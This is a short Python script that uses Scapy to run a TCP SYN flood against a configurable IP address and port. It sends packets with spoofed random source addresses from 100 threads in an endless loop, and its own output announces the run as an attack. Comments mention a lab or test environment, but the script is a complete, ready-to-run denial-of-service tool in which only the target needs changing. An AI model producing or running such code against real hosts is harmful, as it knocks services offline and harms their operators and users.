from scapy.all import *
import random
import threading
import time

# Target IP and port – change these as needed for your test environment
target_ip = "192.168.1.188"  # Replace with your lab target IP
target_port = 80             # Replace with the target port if necessary

# Function to generate a random source IP address
def generate_random_ip():
    # Using 1-254 for each octet to avoid broadcast/zero addresses
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

# Worker function that continuously sends SYN packets
def syn_flood_worker():
    while True:
        src_ip = generate_random_ip()
        # Construct the SYN packet with a random source port and spoofed source IP
        packet = IP(src=src_ip, dst=target_ip) / TCP(sport=random.randint(1024, 65535),
                                                       dport=target_port,
                                                       flags="S")
        # Send packet; verbose is set to False to avoid cluttering the output
        send(packet, verbose=False)

# Main function to launch multiple worker threads
def main():
    thread_count = 100  # Number of concurrent threads; adjust based on your testing environment
    threads = []
    
    print(f"Starting SYN flood attack on {target_ip}:{target_port} with {thread_count} threads ...")
    for _ in range(thread_count):
        thread = threading.Thread(target=syn_flood_worker)
        thread.daemon = True  # Daemon threads exit when the main thread terminates
        thread.start()
        threads.append(thread)
    
    try:
        # Keep the main thread alive to allow worker threads to run indefinitely
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Attack interrupted by user. Exiting...")

if __name__ == "__main__":
    main()
